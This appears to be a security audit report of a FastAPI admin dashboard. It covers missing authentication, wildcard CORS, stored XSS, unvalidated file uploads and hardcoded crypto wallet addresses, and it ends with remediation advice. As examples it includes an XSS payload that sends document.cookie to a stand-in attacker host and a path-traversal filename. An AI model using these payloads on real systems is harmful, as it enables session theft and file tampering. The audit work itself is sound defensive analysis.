# SECURITY ANALYSIS REPORT: /home/user/fesgr/backend/admin.py

## FILE OVERVIEW
- **Type**: FastAPI web application
- **Total Lines**: 2,135 lines
- **Primary Language**: Python (backend) + Embedded JavaScript (frontend)
- **Data Storage**: Plain JSON file (data.json)
- **Upload Directory**: /uploads

---

## 1. API ENDPOINTS (All Unprotected)

### Core Endpoints:
1. **GET  /                          ** - Admin dashboard (HTML/JS page)
2. **GET  /api/stats                 ** - Get statistics
3. **GET  /api/admin/profiles        ** - Get all profiles
4. **POST /api/admin/profiles        ** - Create profile (file upload)
5. **POST /api/admin/profiles/{id}/toggle   ** - Toggle profile visibility
6. **DELETE /api/admin/profiles/{id}        ** - Delete profile
7. **GET  /api/admin/chats                  ** - Get chats
8. **GET  /api/admin/chats/{id}/messages   ** - Get chat messages
9. **POST /api/admin/chats/{id}/reply      ** - Send chat reply (file upload)
10. **POST /api/admin/chats/{id}/system-message ** - Send system message
11. **GET  /api/admin/comments              ** - Get comments
12. **GET  /api/admin/promocodes            ** - Get promocodes
13. **POST /api/admin/promocodes            ** - Create promocode
14. **POST /api/admin/promocodes/{id}/toggle** - Toggle promocode
15. **DELETE /api/admin/promocodes/{id}     ** - Delete promocode
16. **GET  /api/admin/banner                ** - Get banner settings
17. **POST /api/admin/banner                ** - Update banner
18. **GET  /api/admin/crypto_wallets        ** - Get crypto wallets
19. **POST /api/admin/crypto_wallets        ** - Update crypto wallets

---

## 2. CRITICAL SECURITY VULNERABILITIES

### 2.1 NO AUTHENTICATION OR AUTHORIZATION
**Severity: CRITICAL**
- Every single API endpoint is completely unprotected
- No authentication checks before any operation
- No session management or tokens
- No password protection on the dashboard
- Anyone with network access can:
  - View all profiles, messages, comments
  - Modify crypto wallet addresses (line 2122-2129)
  - Create fake profiles and messages
  - Delete all data
  - Modify banner and promotional content

**Code Location**: Lines 1799-2129
```python
# Example - completely unprotected endpoint
@app.get("/api/admin/profiles")
async def get_admin_profiles():
    data = load_data()
    return {"profiles": data["profiles"]}  # NO AUTH CHECK!
```

### 2.2 OPEN CORS CONFIGURATION
**Severity: CRITICAL**
- Allows requests from ANY origin
- Line 19-24:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],        # ALLOWS ALL ORIGINS
    allow_methods=["*"],         # ALLOWS ALL METHODS
    allow_headers=["*"],         # ALLOWS ALL HEADERS
)
```
- Enables Cross-Site Request Forgery (CSRF) attacks
- Allows JavaScript from external websites to access this API

### 2.3 STORED CROSS-SITE SCRIPTING (XSS) - MULTIPLE INSTANCES
**Severity: CRITICAL**

User data is inserted into HTML via `.innerHTML` without ANY sanitization:

#### 2.3.1 Profile Data XSS (Lines 617-645)
```javascript
profileDiv.innerHTML = `
    <span class="profile-name">${profile.name}</span>      // UNESCAPED
    <p><strong>Gender:</strong> ${profile.gender || 'Not specified'}</p>  // UNESCAPED
    <p><strong>Nationality:</strong> ${profile.nationality || 'Not specified'}</p>  // UNESCAPED
    <p><strong>City:</strong> ${profile.city}</p>         // UNESCAPED
    <p><strong>Travel Cities:</strong> ${travelCities}</p> // UNESCAPED
    <p><strong>Description:</strong> ${profile.description}</p>  // UNESCAPED
`;
```
**Attack Vector**: Create a profile with name: `<img src=x onerror="alert('XSS')">` 
This code will execute when admin views profiles.

#### 2.3.2 Comment Text XSS (Lines 1335-1343)
```javascript
commentDiv.innerHTML = `
    <span class="comment-author">${comment.user_name}</span>  // UNESCAPED
    <div class="comment-text">${comment.text}</div>           // UNESCAPED
`;
```
**Attack Vector**: Comments with malicious HTML/JavaScript

#### 2.3.3 Chat Message XSS (Lines 1089, 1103, 1123, 1139, 1155)
```javascript
// System message - line 1089
<div class="system-bubble">${msg.text}</div>   // UNESCAPED

// User message - line 1155
<div>${msg.text}</div>                          // UNESCAPED

// File name - line 1138
<strong>File: ${msg.file_name}</strong>         // UNESCAPED
```
**Attack Vector**: Send message with text like: `<svg onload="fetch('http://attacker.com?cookie='+document.cookie)">`

#### 2.3.4 Promocode XSS (Lines 1393)
```javascript
<span class="promocode-code">${promo.code}</span>  // UNESCAPED
```

#### 2.3.5 VIP Profile XSS (Lines 672-687)
```javascript
<span class="vip-profile-name">${profile.name}</span>  // UNESCAPED
```

### 2.4 INSECURE FILE UPLOAD HANDLING
**Severity: HIGH**

#### 2.4.1 No File Type Validation
- Lines 176-188: File extension is NOT validated on upload
- Uses `file.filename` directly without sanitization (line 179)
- Extension checking is only done for DISPLAY purposes (line 192)
- Allows upload of ANY file type: executables, scripts, etc.

```python
def save_uploaded_file(file: UploadFile) -> str:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"{timestamp}_{file.filename}"  # NO SANITIZATION
    file_path = os.path.join(UPLOAD_DIR, filename)
    
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)  # SAVES ANYTHING
    
    return f"/uploads/{filename}"
```

#### 2.4.2 Path Traversal Vulnerability
- If filename contains `..` or `/`, it could write files outside uploads directory
- Example: `../../etc/passwd` could be submitted

#### 2.4.3 Denial of Service via File Upload
- No file size limits
- No maximum file count limits
- Could fill disk with large files
- Line 1830: `photos: list[UploadFile] = File(...)` accepts unlimited files

#### 2.4.4 Malicious File Upload Risk
- Uploaded files are directly served via `/uploads` mount (line 31)
- `.html`, `.svg`, `.js` files could execute in browser context
- `.php`, `.exe`, `.bat` files could execute on server if misconfigured

### 2.5 PLAIN TEXT DATA STORAGE
**Severity: HIGH**

- All data stored in plain JSON file (data.json) - Line 27
- Contains:
  - All user profiles with personal information
  - Cryptocurrency wallet addresses (Lines 44-47, 82-85, etc.)
  - All chat messages and communications
  - Payment information and comments
  - Promotional codes and discounts
- No encryption
- World-readable if permissions misconfigured
- Accessible to anyone with file system access

```python
DATA_FILE = os.path.join(current_dir, "data.json")
```

Hardcoded wallet addresses visible in code:
- `TY76gU8J9o8j7U6tY5r4E3W2Q1` (TRC20)
- `0x8a9C6e5D8b0E2a1F3c4B6E7D8C9A0B1C2D3E4F5` (ERC20)
- `bnb1q3e5r7t9y1u3i5o7p9l1k3j5h7g9f2d4s6q8w0` (BNB)

### 2.6 NO INPUT VALIDATION
**Severity: MEDIUM**

#### 2.6.1 Form Input Bypasses
- Lines 1819-1831: Profile creation accepts ANY string
- No validation on:
  - Name length
  - Age bounds (input has min/max but not server-side)
  - Gender options (no whitelist check)
  - Nationality (any string)
  - City (any string)
  - Travel cities (no validation)
  - Description length/content
  - Height/Weight bounds

#### 2.6.2 Promocode Creation
- Line 2063: Only checks if code already exists
- No validation on discount value (just parseInt)
- Accepts negative discounts, 0%, or >100%

#### 2.6.3 Chat Messages
- Line 1953: Text is stripped but not validated
- No length limits
- No profanity/spam filtering

### 2.7 HARDCODED DEFAULT DATA
**Severity: MEDIUM**

Lines 43-75: Hardcoded sensitive information:
```python
"settings": {
    "crypto_wallets": {
        "trc20": "TY76gU8J9o8j7U6tY5r4E3W2Q1",
        "erc20": "0x8a9C6e5D8b0E2a1F3c4B6E7D8C9A0B1C2D3E4F5",
        "bnb": "bnb1q3e5r7t9y1u3i5o7p9l1k3j5h7g9f2d4s6q8w0"
    },
    "banner": {
        "text": "Special Offer: 15% discount with promo code WELCOME15",
        "visible": True,
        "link": "https://t.me/yourchannel",
        "link_text": "Join Channel"
    }
}
```
- Wallet addresses exposed in code AND hardcoded defaults
- If the developer submits this to GitHub, keys are permanently exposed

---

## 3. JAVASCRIPT SECURITY ISSUES

### 3.1 Hardcoded Localhost URLs
**Severity: MEDIUM**
- Line 612, 665, 907, 1001, 1005, 1101, 1119, 1140: 
```javascript
img src="http://localhost:8002${photo}"
```
- Won't work in production
- Should use relative paths or proper configuration
- 38+ hardcoded `localhost:8002` references

### 3.2 No Client-Side Validation Bypass Protection
- All validation is only in JavaScript
- Can be bypassed with browser dev tools or direct API calls
- No server-side validation to back it up

### 3.3 Inline Event Handlers
- Multiple onclick handlers in innerHTML:
```javascript
onclick="toggleProfile(${profile.id}, ${!profile.visible})"
onclick="deleteProfile(${profile.id})"
onclick="deleteComment(${comment.profile_id}, ${comment.id})"
```
- If profile.id or comment.id contains malicious JavaScript, it could execute
- Should use addEventListener instead

---

## 4. DATA STORAGE MECHANISMS

### 4.1 Load/Save Functions (Lines 34-173)
```python
def load_data():
    # Reads from data.json
    # Returns default data structure if file doesn't exist
    
def save_data(data):
    # Writes to data.json with json.dump
    # No encryption
    # No backup
    # No transaction safety (could corrupt on error)
```

### 4.2 Data Structure
```json
{
    "profiles": [],           // User profiles
    "vip_profiles": [],       // VIP user profiles
    "chats": [],              // Chat sessions
    "messages": [],           // Chat messages
    "comments": [],           // User comments
    "promocodes": [],         // Discount codes
    "settings": {
        "crypto_wallets": {},
        "banner": {},
        "vip_catalogs": {}
    }
}
```

---

## 5. SECURITY RECOMMENDATIONS

### CRITICAL (Fix Immediately):
1. **Add Authentication**
   - Implement JWT tokens or session-based auth
   - Protect ALL endpoints with @require_auth decorator
   - Add login page with strong password requirements

2. **Implement XSS Protection**
   - Use `textContent` instead of `innerHTML` for user data
   - Implement proper HTML escaping function:
   ```javascript
   function escapeHtml(text) {
       const div = document.createElement('div');
       div.textContent = text;
       return div.innerHTML;
   }
   ```
   - Use template literals for HTML structure, not data

3. **Restrict CORS**
   ```python
   app.add_middleware(
       CORSMiddleware,
       allow_origins=["https://yourdomain.com"],
       allow_methods=["GET", "POST", "DELETE"],
       allow_credentials=True
   )
   ```

4. **Validate File Uploads**
   - Whitelist allowed extensions
   - Check MIME types (not just extension)
   - Set maximum file size
   - Rename files to random names
   - Store outside webroot
   - Disable script execution in upload directory

5. **Encrypt Sensitive Data**
   - Use database instead of JSON
   - Encrypt crypto wallet addresses
   - Hash any sensitive identifiers
   - Use environment variables for secrets

### HIGH PRIORITY:
6. **Add Server-Side Validation**
   - Validate all form inputs on backend
   - Check age range, length limits, valid values
   - Implement rate limiting

7. **Add Input Sanitization**
   - Sanitize all user input before storing
   - Use parameterized queries if using SQL

8. **Remove Hardcoded Secrets**
   - Use environment variables (.env file)
   - Remove wallet addresses from code
   - Never commit sensitive data

### MEDIUM PRIORITY:
9. **Use HTTPS Only**
   - Force redirect HTTP to HTTPS
   - Set secure cookie flags

10. **Add Logging and Monitoring**
    - Log all admin actions
    - Monitor for suspicious activity
    - Add database transaction logging

11. **Use Database Instead of JSON**
    - Implement proper database schema
    - Add indexes for performance
    - Enable proper backup/restore

---

## 6. ENDPOINTS REQUIRING PROTECTION

The following endpoints need authentication:

PROTECTED CRITICAL:
- POST   /api/admin/crypto_wallets (line 2122)
- GET    /api/admin/crypto_wallets (line 2116)
- POST   /api/admin/banner (line 2106)
- GET    /api/admin/banner (line 2100)
- DELETE /api/admin/promocodes/{id} (line 2091)
- POST   /api/admin/promocodes/{id}/toggle (line 2081)
- POST   /api/admin/promocodes (line 2058)
- POST   /api/admin/chats/{id}/system-message (line 2009)
- POST   /api/admin/chats/{id}/reply (line 1926)
- DELETE /api/admin/profiles/{id} (line 1886)
- POST   /api/admin/profiles/{id}/toggle (line 1876)
- POST   /api/admin/profiles (line 1818)
- GET    /api/admin/chats/{id}/messages (line 1916)
- GET    /api/admin/chats (line 1910)
- GET    /api/admin/comments (line 2045)
- GET    /api/admin/profiles (line 1812)

PUBLICLY AVAILABLE (but still consider protecting):
- GET    /api/stats (line 1799)
- GET    / (line 204)

---

## SUMMARY

This application has **SEVERE security vulnerabilities** suitable for a malware analysis scenario:

1. **Zero Authentication** - Anyone can access/modify all admin functions
2. **Multiple XSS vectors** - User data not escaped in 8+ locations
3. **Insecure file uploads** - No validation, potential RCE
4. **Plain text secrets** - Cryptocurrency wallet addresses exposed
5. **No encryption** - All data in plain JSON
6. **Open CORS** - Allows cross-site attacks
7. **No validation** - Malicious input accepted and stored

This application would be vulnerable to:
- Account takeover attacks
- Data theft and manipulation
- Malware injection via file uploads
- Cryptocurrency theft via wallet manipulation
- User credential harvesting via XSS
- Denial of service attacks

